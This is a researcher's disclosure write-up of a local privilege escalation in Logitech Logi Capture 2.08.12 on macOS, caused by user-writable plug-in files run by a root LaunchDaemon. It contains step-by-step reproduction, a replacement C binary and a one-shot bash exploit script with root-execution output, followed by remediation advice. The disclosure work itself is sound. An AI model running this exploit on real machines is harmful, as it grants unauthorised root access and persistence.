---
title:  "NO-CVE 0day: Logitech Logi Capture 2.08.12 macOS Local Privilege Escalation (CoreMediaIO)"
categories: macOS
---

It was possible to achieve local privilege escalation (LPE) through the following high level abuse steps:
- Identification of weak POSIX directory and file permissions for two `CoreMediaIO` Plug-Ins
- Replacement of the `/Library/CoreMediaIO/Plug-Ins/DAL/LogiCapture.plugin/Contents/MacOS/Assistant` binary with a malicious Mach-O
- A reboot of the target macOS device



> NOTE: It may be possible for the same to be achieved through the additional Mach-O binary `/Library/CoreMediaIO/Plug-Ins/DAL/LogiCapture.plugin/Contents/MacOS/LogiCapture` however this was not investigated.

## Steps To Reproduce:

### Download and install Logi Capture

Logitech Capture can be downloaded directly from Logitech's website:
- [Logitech Capture](https://www.logitech.com/en-gb/software/capture.html)
- [Logitech Capture Direct Download](https://download01.logi.com/web/ftp/pub/techsupport/capture/Capture_2.08.12.zip)

The installation can be confirmed with the following command:
```bash
10:44:43-testmac@mpro:~/Desktop/LOGITECH/LOGI_CAPTURE/CoreMediaIO_LPE$ lsappinfo | grep "Logi Capture" -A 6
46) "Logi Capture" ASN:0x0-0x69069: 
    bundleID="com.logitech.logicapture"
    bundle path="/Applications/Logi Capture.app"
    executable path="/Applications/Logi Capture.app/Contents/MacOS/Logi Capture"
    pid = 1378 type="Foreground" flavor=3 Version="2.08.12" fileType="APPL" creator="????" Arch=x86_64 
    parentASN="Spotlight" ASN:0x1-0x2ff: 
    launch time =  2023/12/28 10:24:10 ( 20 minutes, 36.2109 seconds ago )
    checkin time = 2023/12/28 10:24:10 ( 20 minutes, 36.016 seconds ago )
    launch to checkin time: 0.194869 seconds
```

### Confirm the use of the vulnerable directory in the LaunchDaemons plist
Confirmation that `Logi Capture` makes use of `/Library/CoreMediaIO/Plug-Ins/DAL/LogiCapture.plugin/Contents/MacOS/Assistant` for the Launch Daemon in the `com.SplitMediaLabs.LogiCapture.Assistant.plist` Launch Daemons configuration plist file.
```xml
13:50:01-testmac@mpro:~/Desktop/LOGITECH/LOGI_CAPTURE/CoreMediaIO_LPE$ plutil -convert xml1 /Library/LaunchDaemons/com.SplitMediaLabs.LogiCapture.Assistant.plist -o com.SplitMediaLabs.LogiCapture.Assistant.plist
13:50:04-testmac@mpro:~/Desktop/LOGITECH/LOGI_CAPTURE/CoreMediaIO_LPE$ cat com.SplitMediaLabs.LogiCapture.Assistant.plist 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
        <key>Label</key>
        <string>com.SplitMediaLabs.LogiCapture.Assistant</string>
        <key>MachServices</key>
        <dict>
                <key>com.SplitMediaLabs.LogiCapture.Assistant</key>
                <true/>
        </dict>
        <key>NSCameraUsageDescription</key>
        <string>Logi Capture Virtual Camera </string>
        <key>ProgramArguments</key>
        <array>
                <string>/Library/CoreMediaIO/Plug-Ins/DAL/LogiCapture.plugin/Contents/MacOS/Assistant</string>
                <string>--timeout</string>
                <string>300.0</string>
        </array>
</dict>
</plist>
```

### Confirm the use of the vulnerable component
Confirmation that `Assistant` process is running as root when the `Logi Capture` is running.
```bash
13:52:13-testmac@mpro:~/Desktop/LOGITECH/LOGI_CAPTURE/CoreMediaIO_LPE$ processes | grep DAL
root               674     0     0 ??       /Library/CoreMediaIO/Plug-Ins/DAL/LogiCapture.plugin/Contents/MacOS/Assistant --timeout 300.0
```

```bash
13:55:00-testmac@mpro:~/Desktop/LOGITECH/LOGI_CAPTURE/CoreMediaIO_LPE$ sudo launchctl list | grep com.SplitMediaLabs.LogiCapture.Assistant
Password:
674     0       com.SplitMediaLabs.LogiCapture.Assistant
```



### Confirm the weak directory permissions
The directory permissions can be identified with the following command:
```bash
13:55:07-testmac@mpro:~/Desktop/LOGITECH/LOGI_CAPTURE/CoreMediaIO_LPE$ ls -lah /Library/CoreMediaIO/Plug-Ins/DAL/
total 0
drwxr-xr-x  4 root     wheel   128B 21 Dec 11:35 .
drwxr-xr-x  3 root     wheel    96B 11 Jul 01:56 ..
drwxr-xr-x@ 3 testmac  staff    96B 24 Oct  2021 LogiCapture.plugin
-rw-r--r--  1 root     wheel    37B 11 Jul 01:56 plugins-info.txt
13:55:11-testmac@mpro:~/Desktop/LOGITECH/LOGI_CAPTURE/CoreMediaIO_LPE$ ls -lah /Library/CoreMediaIO/Plug-Ins/DAL/LogiCapture.plugin/Contents/MacOS/
total 688
drwxr-xr-x@ 4 testmac  staff   128B 24 Oct  2021 .
drwxr-xr-x@ 6 testmac  staff   192B 24 Oct  2021 ..
-rwxr-xr-x@ 1 testmac  staff    47K 24 Oct  2021 Assistant
-rwxr-xr-x@ 1 testmac  staff   293K 24 Oct  2021 LogiCapture
```





### Prepare the malicious Mach-O

The following c code can be compiled as the malicious dylib. The result of the `date`, `whoami` and `id` commands are redirected into the `/tmp/com.Logitech.Assistant.Service.pwn` file. The contents can be arbritrary, e.g. changing file permissions on protected files, installing persistence or providing a root terminal.
```c
/* gcc Logitech_Assistant_LPE.c -o Logitech_Assistant_LPE */
#include <stdlib.h>
int main() {
    system("date >> /tmp/com.Logitech.Assistant.Service.pwn");
    system("whoami >> /tmp/com.Logitech.Assistant.Service.pwn");
    system("id >> /tmp/com.Logitech.Assistant.Service.pwn");
    return 0;
}
```

The original `Assistant` Mach-O was preserved:
```
13:55:15-testmac@mpro:~/Desktop/LOGITECH/LOGI_CAPTURE/CoreMediaIO_LPE$ mv /Library/CoreMediaIO/Plug-Ins/DAL/LogiCapture.plugin/Contents/MacOS/Assistant /Library/CoreMediaIO/Plug-Ins/DAL/LogiCapture.plugin/Contents/MacOS/Assistant.bak
```

The malicious `Assistant` Mach-O was copied to the vulnerable path:
```c
13:55:19-testmac@mpro:~/Desktop/LOGITECH/LOGI_CAPTURE/CoreMediaIO_LPE$ head Logitech_Assistant_LPE.c 
/* gcc Logitech_Assistant_LPE.c -o Logitech_Assistant_LPE */
#include <stdlib.h>
int main() {
    // system("/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal");
    system("date >> /tmp/com.Logitech.Assistant.Service.pwn");
    system("whoami >> /tmp/com.Logitech.Assistant.Service.pwn");
    system("id >> /tmp/com.Logitech.Assistant.Service.pwn");
    return 0;
}
13:55:20-testmac@mpro:~/Desktop/LOGITECH/LOGI_CAPTURE/CoreMediaIO_LPE$ gcc Logitech_Assistant_LPE.c -o Logitech_Assistant_LPE
13:55:21-testmac@mpro:~/Desktop/LOGITECH/CoreMediaIO_LPE$ cp Logitech_Assistant_LPE /Library/CoreMediaIO/Plug-Ins/DAL/LogiCapture.plugin/Contents/MacOS/Assistant
```


### Restart the MacOS machine or simulate a service restart 

The machine can be rebooted or the service can be restarted in order to simulate a reboot:
```bash
13:57:38-testmac@mpro:~/Desktop/LOGITECH/LOGI_CAPTURE/CoreMediaIO_LPE$ sudo launchctl kickstart -k system/com.SplitMediaLabs.LogiCapture.Assistant
Password:
```

### Verify the `root` code execution
The `/tmp/com.Logitech.Assistant.Service.pwn` file contains the result of the `root` code execution:
```bash
14:02:38-testmac@mpro:~/Desktop/LOGITECH/LOGI_CAPTURE/CoreMediaIO_LPE$ tail -f /tmp/com.Logitech.Assistant.Service.pwn
Fri Dec 29 14:41:23 PST 2023
root
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
```


## One-shot exploit PoC 

```bash
########################################################################################################################
#!/bin/bash
########################################################################################################################
/bin/echo "[i] Title:  Logitech Logi Capture 2.08.12 macOS Local Privilege Escalation (CoreMediaIO)"
/bin/echo "[i] Author: emkay128"
/bin/echo "[i] File:   CoreMediaIO_pwn.sh"
########################################################################################################################
VULN_FILE=Assistant
DEMO_NAME=${VULN_FILE}_LPE
PATH="/Library/CoreMediaIO/Plug-Ins/DAL/LogiCapture.plugin/Contents/MacOS/"
PLIST=/Library/LaunchDaemons/com.SplitMediaLabs.LogiCapture.Assistant.plist
LPE_OUTFILE="/tmp/${VULN_FILE}.pwn"
########################################################################################################################
# STAGE 1 [EXPLOIT] #######################################################################################################
/bin/echo "[i] Checking if $PLIST exists"
if [ ! -f $PLIST ]; 
then
    /bin/echo "[FAIL] $PLIST doesn't exist :("
    exit   
fi

echo "[i] Viewing permissions for $VULN_FILE"
/bin/ls -@ -lah "$PATH"

test -w "${PATH}${VULN_FILE}" || {
   /bin/echo "[FAIL] Cannot write to the vuln file ${PATH}${VULN_FILE} :("
   exit
}

/bin/echo "[i] Creating backup of $VULN_FILE"
/bin/cp ${PATH}${VULN_FILE} ${PATH}${VULN_FILE}.bak

/bin/echo "[i] Creating $DEMO_NAME.c file"
/bin/cat << EOF > /tmp/$DEMO_NAME.c
#include <stdlib.h>
int main() {
    system("/bin/date > $LPE_OUTFILE");
    system("/usr/bin/whoami >> $LPE_OUTFILE");
    system("/usr/bin/id >> $LPE_OUTFILE");
    return 0;
}
EOF

/bin/echo "[i] Compiling $DEMO_NAME.c file"
/usr/bin/gcc /tmp/$DEMO_NAME.c -o /tmp/$DEMO_NAME

/bin/echo "[i] chmodding $DEMO_NAME"
/bin/chmod +x /tmp/$DEMO_NAME

/bin/echo "[i] Copying malicious Mach-O to launchd path"
/bin/cp /tmp/$DEMO_NAME ${PATH}${VULN_FILE}

/bin/echo "[i] Simulating a reboot (Needs password and saves you having to reboot your machine) (sudo launchctl kickstart -k system/com.SplitMediaLabs.LogiCapture.Assistant)"
/usr/bin/sudo /bin/launchctl kickstart -k system/com.SplitMediaLabs.LogiCapture.Assistant

/bin/echo "[i] Sleeping for 5 seconds"
/bin/sleep 5

/bin/echo "[i] Viewing the result of LPE"
/bin/cat $LPE_OUTFILE

/bin/echo "[i] Restoring the binary"
/bin/mv ${PATH}${VULN_FILE}.bak ${PATH}${VULN_FILE}

/bin/echo "[i] Cleaning up"
/bin/rm -rf /tmp/${DEMO_NAME}*

/bin/echo "[i] Пока Пока !!!"
```







## Remedial Action
The POSIX directory permissions should be restricted so that only the `root` user and `wheel` group can access the directory structure and files used by permissioned XPC LaunchDaemon services.


## Further Information
- [Logitech Capture](https://www.logitech.com/en-gb/software/capture.html)
- [Logitech Capture Direct Download](https://download01.logi.com/web/ftp/pub/techsupport/capture/Capture_2.08.12.zip)
- [Core Media I/O](https://developer.apple.com/documentation/coremediaio)
- [Creating Launch Daemons and Agents -- Apple](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)

## Impact

Local Privilege Escalation